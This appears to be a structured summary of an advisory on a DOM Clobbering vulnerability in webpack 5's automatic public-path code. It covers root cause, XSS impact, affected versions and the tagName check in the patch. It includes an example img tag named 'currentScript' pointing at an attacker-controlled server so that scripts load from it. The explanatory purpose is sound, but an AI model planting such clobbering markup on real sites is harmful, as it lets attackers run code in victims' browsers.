**2. Extracted Information:**

*   **Root Cause of Vulnerability:**
    *   The vulnerability stems from the `AutoPublicPathRuntimeModule` in Webpack, specifically how it determines the base URL for dynamically loaded JavaScript files.
    *   The code uses `document.currentScript.src` to get the current script's URL. This is vulnerable to DOM Clobbering.
    *   An attacker can inject an HTML element (e.g., `<img name="currentScript" src="https://attacker.controlled.server/">`) with `name="currentScript"`, which shadows the `document.currentScript` property, causing it to return an attacker-controlled object instead of the script element.
    *   The attacker-controlled object's `src` property is used as the base URL, leading to the loading of malicious JavaScript from the attacker's server.

*   **Weaknesses/Vulnerabilities Present:**
    *   DOM Clobbering: The code uses a property (`document.currentScript`) that can be overwritten by attacker-controlled HTML elements with a matching name/id, exploiting the named property access behavior of browsers.
    *   Insecure URL Resolution: The code uses the potentially clobbered `document.currentScript.src` value to construct the base URL for dynamically loaded scripts without proper validation/sanitization.
    *   Lack of input sanitization: The `name` attribute of the `img` tag was not sanitized, allowing it to be used for a DOM clobbering attack.

*   **Impact of Exploitation:**
    *   Cross-Site Scripting (XSS): An attacker can inject malicious JavaScript into a web page by controlling the base URL for dynamically loaded scripts, which leads to arbitrary code execution.

*   **Attack Vectors:**
    *   HTML Injection: The attacker needs a way to insert a crafted HTML element into the target webpage. This can be achieved through:
        *   Vulnerabilities in user-generated content handling (e.g., comments, posts, markdown renderers).
        *   HTML injection vulnerabilities in third-party JavaScript or website functionalities that reflect user inputs.

*   **Required Attacker Capabilities/Position:**
    *   Ability to inject arbitrary HTML: The attacker must be able to inject HTML elements into the DOM of the target web page, without triggering any sanitization that would remove the `name` attribute from the clobbering tag.
    *   No user interaction: The vulnerability can be exploited without user interaction once the malicious HTML is present on the page.

**3. Additional Details from the Content:**

*   **Webpack Versions Affected:** The advisory initially indicated that Webpack versions below 5.94.0 were affected, but a later correction clarified that only webpack@5 was affected, and webpack@4 was not affected.
*   **Real-World Example:** A real-world exploitation was found in the Canvas LMS, demonstrating the severity of the vulnerability.
*   **Mitigation:** The patch implemented in Webpack 5 checks if `document.currentScript` is a script tag (`document.currentScript.tagName.toUpperCase() === 'SCRIPT'`) to prevent it from being clobbered by a non-script tag.
*   **DOM Clobbering Explanation:** The research.securitum.com content provides a detailed explanation of DOM Clobbering, including:
    *   How HTML elements with `id` or `name` attributes can overwrite JavaScript variables and properties on the window object.
    *   How HTMLCollection is created when multiple elements have the same `id`, and how properties of these can be accessed via index or `name`.
    *   How `<a>` elements return the `href` value when cast to a string, allowing an attacker to use it for code injection.
*   **AMP4Email vulnerability**: The research.securitum.com content also described a similar DOM clobbering vulnerability in AMP4Email and its exploit.

**4. Summary of relevant technical details:**

*   The vulnerability lies in the way webpack's `AutoPublicPathRuntimeModule` determines the base URL for dynamic imports. It incorrectly trusts `document.currentScript.src`.
*   Attackers can inject HTML elements with `name="currentScript"` to override the expected value of `document.currentScript`, and use the src attribute of this element to inject arbitrary code.
*   The fix involves checking if `document.currentScript` is indeed a script tag before using its `src` attribute to avoid the clobbering attack, and ensures that the script tag's name is `SCRIPT`.
*   The vulnerability only affects webpack@5, and not prior versions.
*   The `research.securitum.com` blog post provides additional technical background on DOM Clobbering attacks.
